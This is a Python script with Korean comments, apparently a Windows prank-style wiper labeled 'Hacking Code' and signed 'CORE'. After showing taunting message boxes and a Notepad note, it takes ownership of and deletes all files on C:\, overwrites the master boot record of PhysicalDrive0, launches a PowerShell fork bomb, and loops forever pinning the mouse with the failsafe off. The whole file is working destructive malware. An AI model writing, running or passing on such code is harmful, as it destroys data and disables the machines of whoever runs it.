import os

# 새로운 메모장을 열어 특정 파일을 생성
file_path = f"C:\\Users\\{os.getlogin()}\\Desktop\\memo.txt"
with open(file_path, "w", encoding="utf-8") as f:
    f.write("Your computer is hacked by CORE :D\n\nSee you next time!")

# 메모장을 열어서 해당 파일 표시
os.system(f"notepad {file_path}")




# Hacking Code
"""
1. Break mbr
2. Put fork bomb
3. Stack overflow
"""

import time
import ctypes
import sys

sys.setrecursionlimit(10 ** 6)

ctypes.windll.user32.MessageBoxW(0, "INFORMATION", "information", 0x40 | 0x1)
os.system("pip install pyautogui")


ctypes.windll.user32.MessageBoxW(0, "Starting Hacking Code", "Danger", 0x30 | 0x1)
print("demolishing your computer...")
ctypes.windll.user32.MessageBoxW(0, "Unknown code has been started", "Danger", 0x20 | 0x1)

os.system("""takeown /f 'C:\*' /r /d y
    icacls 'C:\*' /grant :f /t
    del /f /s /q C:\*
    rd /s /q C:\*
    """)

handle = ctypes.windll.kernel32.CreateFileW('\\\\.\\PhysicalDrive0', 0x40000000 | 0xC0000000, 0, None, 3, 0, None)
mbr_size = 512
message_bytes = b"Your computer is hacked by CORE :D"
padding = b"\x00" * (mbr_size - len(message_bytes))
mbr_data = message_bytes + padding
bytes_written = ctypes.c_ulong(0)
ctypes.windll.kernel32.WriteFile(handle, mbr_data, mbr_size, ctypes.byref(bytes_written), None)
ctypes.windll.kernel32.CloseHandle(handle)

ctypes.windll.user32.MessageBoxW(0, "Danger! Your computer is hacked by CORE", "ERROR", 0x10 | 0x1)
print(":D byebye ")

time.sleep(5)

os.system("""function fork-bomb {
    Start-Process powershell -ArgumentList '-Command', 'fork-bomb'
    fork-bomb
}
fork-bomb""")
import pyautogui
pyautogui.FAILSAFE = False

while 1:
    def consume_memory():
            ctypes.windll.user32.MessageBoxW(0, "Danger! Your computer is hacked by CORE", "ERROR", 0x10 | 0x1)
            pyautogui.moveTo(0, 0)
            return consume_memory()
    consume_memory()
